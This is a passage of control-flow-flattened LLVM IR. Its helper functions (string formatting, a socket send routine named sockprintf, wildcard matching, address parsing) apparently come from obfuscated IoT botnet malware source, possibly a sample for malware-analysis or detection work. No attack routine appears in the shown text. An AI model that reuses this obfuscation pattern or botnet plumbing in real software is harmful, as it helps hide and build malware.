loopEnd:                                          ; preds = %303, %299, %296, %295, %288, %287, %286, %274, %269, %263, %257, %251, %244, %239, %233, %226, %220, %213, %208, %202, %195, %189, %182, %177, %171, %164, %158, %151, %146, %140, %133, %127, %121, %120, %118, %110, %105, %99, %93, %87, %84, %75, %73, %68, %62, %61, %56, %50, %49, %46, %40, %39, %33, %32, %24, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 2029100504, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2029100504, label %first
    i32 836163728, label %16
    i32 -137982144, label %18
    i32 874592527, label %23
    i32 1972292920, label %26
    i32 -1470700070, label %29
    i32 1509127307, label %34
    i32 1276964457, label %35
    i32 -945953148, label %39
    i32 361687641, label %44
    i32 1675380441, label %45
    i32 -1629617823, label %46
    i32 -1079581354, label %51
    i32 -1349739639, label %52
    i32 1576536046, label %56
    i32 1300611719, label %61
    i32 664608380, label %64
    i32 689573756, label %65
    i32 1307520094, label %66
    i32 889037452, label %71
    i32 -1732114811, label %78
    i32 -1227361973, label %81
    i32 19474420, label %82
    i32 1422488587, label %86
    i32 1172043003, label %91
    i32 -754750401, label %94
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sgt i32 %.reload, 0
  %15 = select i1 %14, i32 836163728, i32 -1629617823
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  %17 = load i8*, i8** %6, align 8
  store i8* %17, i8** %12, align 8
  store i32 -137982144, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %12, align 8
  %20 = load i8, i8* %19, align 1
  %21 = icmp ne i8 %20, 0
  %22 = select i1 %21, i32 874592527, i32 -1470700070
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %11, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %11, align 4
  store i32 1972292920, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  store i32 -137982144, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  %33 = select i1 %32, i32 1509127307, i32 1276964457
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -945953148, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub nsw i32 %37, %36
  store i32 %38, i32* %7, align 4
  store i32 -945953148, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  %41 = and i32 %40, 2
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 361687641, i32 1675380441
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 48, i32* %10, align 4
  store i32 1675380441, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 -1629617823, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %8, align 4
  %48 = and i32 %47, 1
  %49 = icmp ne i32 %48, 0
  %50 = select i1 %49, i32 689573756, i32 -1079581354
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 -1349739639, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp sgt i32 %53, 0
  %55 = select i1 %54, i32 1576536046, i32 664608380
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8**, i8*** %5, align 8
  %58 = load i32, i32* %10, align 4
  call void @printchar(i8** %57, i32 %58)
  %59 = load i32, i32* %9, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %9, align 4
  store i32 1300611719, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %7, align 4
  store i32 -1349739639, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 689573756, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 1307520094, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %6, align 8
  %68 = load i8, i8* %67, align 1
  %69 = icmp ne i8 %68, 0
  %70 = select i1 %69, i32 889037452, i32 -1227361973
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8**, i8*** %5, align 8
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  call void @printchar(i8** %72, i32 %75)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %9, align 4
  store i32 -1732114811, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %6, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %6, align 8
  store i32 1307520094, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 19474420, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %7, align 4
  %84 = icmp sgt i32 %83, 0
  %85 = select i1 %84, i32 1422488587, i32 -754750401
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %10, align 4
  call void @printchar(i8** %87, i32 %88)
  %89 = load i32, i32* %9, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %9, align 4
  store i32 1172043003, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  store i32 19474420, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %9, align 4
  ret i32 %95

loopEnd:                                          ; preds = %91, %86, %82, %81, %78, %71, %66, %65, %64, %61, %56, %52, %51, %46, %45, %44, %39, %35, %34, %29, %26, %23, %18, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem = alloca i32
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  store i32 %23, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1196861406, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1196861406, label %first
    i32 -2062115657, label %26
    i32 -59440845, label %34
    i32 -505118672, label %38
    i32 1163978231, label %42
    i32 1597481770, label %46
    i32 2097999798, label %49
    i32 -1148544654, label %54
    i32 -931300616, label %58
    i32 473417437, label %65
    i32 2138436612, label %71
    i32 -645934817, label %80
    i32 1767727280, label %84
    i32 1735549444, label %88
    i32 1627761788, label %93
    i32 -606179465, label %99
    i32 989772858, label %102
    i32 1761441317, label %103
    i32 -1587238718, label %111
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %24 = icmp eq i32 %.reload, 0
  %25 = select i1 %24, i32 -2062115657, i32 -59440845
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %27, align 1
  %28 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %28, align 1
  %29 = load i8**, i8*** %9, align 8
  %30 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %31 = load i32, i32* %13, align 4
  %32 = load i32, i32* %14, align 4
  %33 = call i32 @prints(i8** %29, i8* %30, i32 %31, i32 %32)
  store i32 %33, i32* %8, align 4
  store i32 -1587238718, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i32, i32* %12, align 4
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 -505118672, i32 2097999798
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = icmp eq i32 %39, 10
  %41 = select i1 %40, i32 1163978231, i32 2097999798
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = icmp slt i32 %43, 0
  %45 = select i1 %44, i32 1597481770, i32 2097999798
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1, i32* %19, align 4
  %47 = load i32, i32* %10, align 4
  %48 = sub nsw i32 0, %47
  store i32 %48, i32* %21, align 4
  store i32 2097999798, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %51 = getelementptr inbounds i8, i8* %50, i64 12
  %52 = getelementptr inbounds i8, i8* %51, i64 -1
  store i8* %52, i8** %17, align 8
  %53 = load i8*, i8** %17, align 8
  store i8 0, i8* %53, align 1
  store i32 -1148544654, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %21, align 4
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 -931300616, i32 -645934817
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %21, align 4
  %60 = load i32, i32* %11, align 4
  %61 = urem i32 %59, %60
  store i32 %61, i32* %18, align 4
  %62 = load i32, i32* %18, align 4
  %63 = icmp sge i32 %62, 10
  %64 = select i1 %63, i32 473417437, i32 2138436612
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %15, align 4
  %67 = sub nsw i32 %66, 48
  %68 = sub nsw i32 %67, 10
  %69 = load i32, i32* %18, align 4
  %70 = add nsw i32 %69, %68
  store i32 %70, i32* %18, align 4
  store i32 2138436612, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %18, align 4
  %73 = add nsw i32 %72, 48
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %17, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 -1
  store i8* %76, i8** %17, align 8
  store i8 %74, i8* %76, align 1
  %77 = load i32, i32* %11, align 4
  %78 = load i32, i32* %21, align 4
  %79 = udiv i32 %78, %77
  store i32 %79, i32* %21, align 4
  store i32 -1148544654, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %19, align 4
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 1767727280, i32 1761441317
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 1735549444, i32 -606179465
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %14, align 4
  %90 = and i32 %89, 2
  %91 = icmp ne i32 %90, 0
  %92 = select i1 %91, i32 1627761788, i32 -606179465
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %94, i32 45)
  %95 = load i32, i32* %20, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %20, align 4
  %97 = load i32, i32* %13, align 4
  %98 = add nsw i32 %97, -1
  store i32 %98, i32* %13, align 4
  store i32 989772858, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 -1
  store i8* %101, i8** %17, align 8
  store i8 45, i8* %101, align 1
  store i32 989772858, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 1761441317, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %20, align 4
  %105 = load i8**, i8*** %9, align 8
  %106 = load i8*, i8** %17, align 8
  %107 = load i32, i32* %13, align 4
  %108 = load i32, i32* %14, align 4
  %109 = call i32 @prints(i8** %105, i8* %106, i32 %107, i32 %108)
  %110 = add nsw i32 %104, %109
  store i32 %110, i32* %8, align 4
  store i32 -1587238718, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  ret i32 %112

loopEnd:                                          ; preds = %103, %102, %99, %93, %88, %84, %80, %71, %65, %58, %54, %49, %46, %42, %38, %34, %26, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %.reg2mem = alloca i8**
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  store i8** %5, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 937895574, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 937895574, label %first
    i32 -766188208, label %8
    i32 -487118223, label %16
    i32 755699059, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
  %6 = icmp ne i8** %.reload, null
  %7 = select i1 %6, i32 -766188208, i32 -487118223
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = trunc i32 %9 to i8
  %11 = load i8**, i8*** %3, align 8
  %12 = load i8*, i8** %11, align 8
  store i8 %10, i8* %12, align 1
  %13 = load i8**, i8*** %3, align 8
  %14 = load i8*, i8** %13, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %13, align 8
  store i32 755699059, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = bitcast i32* %4 to i8*
  %18 = call i64 @write(i32 1, i8* %17, i64 1)
  store i32 755699059, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #5
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.73, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #9
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #5
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 2018789291, i32* %switchVar
  %.reg2mem12 = alloca i1
  %.reg2mem14 = alloca i1
  %.reg2mem16 = alloca i1
  %.reg2mem18 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 2018789291, label %NodeBlock5
    i32 843999318, label %NodeBlock
    i32 1190313481, label %LeafBlock3
    i32 -1823552742, label %LeafBlock1
    i32 581391840, label %LeafBlock
    i32 1647729993, label %14
    i32 -175414287, label %18
    i32 -1573762302, label %25
    i32 1929445283, label %31
    i32 -949496897, label %38
    i32 -911167586, label %39
    i32 -1479545236, label %42
    i32 70886643, label %48
    i32 2044913044, label %56
    i32 -196892858, label %NewDefault
    i32 -1878566744, label %59
    i32 -308911007, label %70
    i32 -878346034, label %78
    i32 725657729, label %81
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem
  %Pivot6 = icmp slt i32 %.reload11, 42
  %9 = select i1 %Pivot6, i32 581391840, i32 843999318
  store i32 %9, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload9, 63
  %10 = select i1 %Pivot, i32 -1823552742, i32 1190313481
  store i32 %10, i32* %switchVar
  br label %loopEnd

LeafBlock3:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf4 = icmp eq i32 %.reload, 63
  %11 = select i1 %SwitchLeaf4, i32 -1479545236, i32 -196892858
  store i32 %11, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload8 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload8, 42
  %12 = select i1 %SwitchLeaf2, i32 -175414287, i32 -196892858
  store i32 %12, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload10, 0
  %13 = select i1 %SwitchLeaf, i32 1647729993, i32 -196892858
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  store i32 %17, i32* %3, align 4
  store i32 725657729, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = getelementptr inbounds i8, i8* %19, i64 1
  %21 = load i8*, i8** %5, align 8
  %22 = call i32 @wildString(i8* %20, i8* %21)
  %23 = icmp ne i32 %22, 0
  %24 = select i1 %23, i32 -1573762302, i32 -911167586
  store i32 %24, i32* %switchVar
  store i1 true, i1* %.reg2mem14
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i8*, i8** %5, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp ne i32 %28, 0
  %30 = select i1 %29, i32 1929445283, i32 -949496897
  store i32 %30, i32* %switchVar
  store i1 false, i1* %.reg2mem12
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i8*, i8** %4, align 8
  %33 = load i8*, i8** %5, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = call i32 @wildString(i8* %32, i8* %34)
  %36 = icmp ne i32 %35, 0
  %37 = xor i1 %36, true
  store i32 -949496897, i32* %switchVar
  store i1 %37, i1* %.reg2mem12
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload13 = load i1, i1* %.reg2mem12
  store i32 -911167586, i32* %switchVar
  store i1 %.reload13, i1* %.reg2mem14
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %.reload15 = load i1, i1* %.reg2mem14
  %40 = xor i1 %.reload15, true
  %41 = zext i1 %40 to i32
  store i32 %41, i32* %3, align 4
  store i32 725657729, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp ne i32 %45, 0
  %47 = select i1 %46, i32 70886643, i32 2044913044
  store i32 %47, i32* %switchVar
  store i1 false, i1* %.reg2mem16
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8*, i8** %4, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 1
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = call i32 @wildString(i8* %50, i8* %52)
  %54 = icmp ne i32 %53, 0
  %55 = xor i1 %54, true
  store i32 2044913044, i32* %switchVar
  store i1 %55, i1* %.reg2mem16
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %.reload17 = load i1, i1* %.reg2mem16
  %57 = xor i1 %.reload17, true
  %58 = zext i1 %57 to i32
  store i32 %58, i32* %3, align 4
  store i32 725657729, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -1878566744, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8*, i8** %4, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = call i32 @toupper(i32 %62) #9
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = call i32 @toupper(i32 %66) #9
  %68 = icmp eq i32 %63, %67
  %69 = select i1 %68, i32 -308911007, i32 -878346034
  store i32 %69, i32* %switchVar
  store i1 false, i1* %.reg2mem18
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i8*, i8** %4, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 1
  %73 = load i8*, i8** %5, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 1
  %75 = call i32 @wildString(i8* %72, i8* %74)
  %76 = icmp ne i32 %75, 0
  %77 = xor i1 %76, true
  store i32 -878346034, i32* %switchVar
  store i1 %77, i1* %.reg2mem18
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %.reload19 = load i1, i1* %.reg2mem18
  %79 = xor i1 %.reload19, true
  %80 = zext i1 %79 to i32
  store i32 %80, i32* %3, align 4
  store i32 725657729, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i32, i32* %3, align 4
  ret i32 %82

loopEnd:                                          ; preds = %78, %70, %59, %NewDefault, %56, %48, %42, %39, %38, %31, %25, %18, %14, %LeafBlock, %LeafBlock1, %LeafBlock3, %NodeBlock, %NodeBlock5, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #5
  store i32 %8, i32* %.reg2mem
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 1472829400, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1472829400, label %first
    i32 -983812755, label %13
    i32 -842689780, label %14
    i32 970204600, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %11 = icmp eq i32 %.reload, -1
  %12 = select i1 %11, i32 -983812755, i32 -842689780
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 970204600, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 970204600, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %3, align 4
  ret i32 %16

loopEnd:                                          ; preds = %14, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
